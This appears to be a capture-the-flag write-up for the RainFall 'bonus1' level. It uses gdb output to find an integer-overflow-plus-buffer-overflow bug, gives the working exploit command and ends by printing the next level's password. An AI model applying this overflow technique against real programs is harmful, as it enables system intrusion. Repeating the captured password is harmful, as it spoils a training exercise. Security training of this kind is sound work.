@@ -1,0 +1,121 @@
+# We have a executable "bonus1" lets do some test!
+
+>bonus1@RainFall:~$ ./bonus1
+Segmentation fault (core dumped)
+>bonus1@RainFall:~$ ./bonus1 test
+>bonus1@RainFall:~$ ./bonus1 test test
+>bonus1@RainFall:~$ ./bonus1 test test test
+>bonus1@RainFall:~$ 
+
+# Nothing interesting, let's use gdb
+
+>bonus1@RainFall:~$ gdb bonus1
+(gdb) disas main
+Dump of assembler code for function main:
+[...]
+   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+   0x08048448 <+36>:	mov    $0x1,%eax
+   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
+   0x0804844f <+43>:	mov    0x3c(%esp),%eax
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+   0x0804845a <+54>:	mov    0xc(%ebp),%eax
+   0x0804845d <+57>:	add    $0x8,%eax
+[...]
+   0x08048470 <+76>:	mov    %eax,(%esp)
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+   0x08048480 <+92>:	jne    0x804849e <main+122>
+   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
+   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
+   0x08048492 <+110>:	movl   $0x8048583,(%esp)
+   0x08048499 <+117>:	call   0x8048350 <execl@plt>
+   0x0804849e <+122>:	mov    $0x0,%eax
+   0x080484a3 <+127>:	leave  
+   0x080484a4 <+128>:	ret    
+End of assembler dump.
+
+# So the program take two argument, it atoi the first one and if superior to 9 exit the program. Otherwise it memcpy n character (n is determine by the fist argument) of the second argument
+
+# But there is no check for a negative number maybe we can exploit that because memcpy take a unsigned int
+
+# Let's test
+
+
+(gdb) b *0x08048473
+Breakpoint 1 at 0x8048473
+(gdb) r -10000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/user/bonus1/bonus1 -10000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) i r
+eax            0xbffff5e4	-1073744412
+ecx            0xffff63c0	-40000
+edx            0xbffff812	-1073743854
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5d0	0xbffff5d0
+ebp            0xbffff618	0xbffff618
+esi            0x0	0
+edi            0x0	0
+eip            0x8048473	0x8048473 <main+79>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7f62412 in ?? () from /lib/i386-linux-gnu/libc.so.6
+
+# Yes negative number pass the check
+
+# Now we need to find the padding and the correct negative number to put as argument
+
+(gdb) r 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048473 in main ()
+(gdb) i r
+eax            0xbffff5d4	-1073744428
+ecx            0x24	36
+edx            0xbffff808	-1073743864
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5c0	0xbffff5c0
+ebp            0xbffff608	0xbffff608
+esi            0x0	0
+edi            0x0	0
+eip            0x8048473	0x8048473 <main+79>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) i f
+Stack level 0, frame at 0xbffff610:
+ eip = 0x8048473 in main; saved eip 0xb7e454d3
+ Arglist at 0xbffff608, args: 
+ Locals at 0xbffff608, Previous frame's sp is 0xbffff610
+ Saved registers:
+  ebp at 0xbffff608, eip at 0xbffff60c
+
+# eax is at 0xbffff5d4 and eip at 0xbffff60c so the padding is equal to 56
+
+# And for the number we will use -1073741800 which will be equal to 96
+
+# And for the address we will take the one after the jne so it will call execl 
+
+>bonus1@RainFall:~$ ./bonus1 -1073741800 $(python -c "print('A' * 56 + '\x82\x84\x04\x08')")
+$ whoami
+bonus2
+$ cd ..
+$ cd bonus2
+$ cat .pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
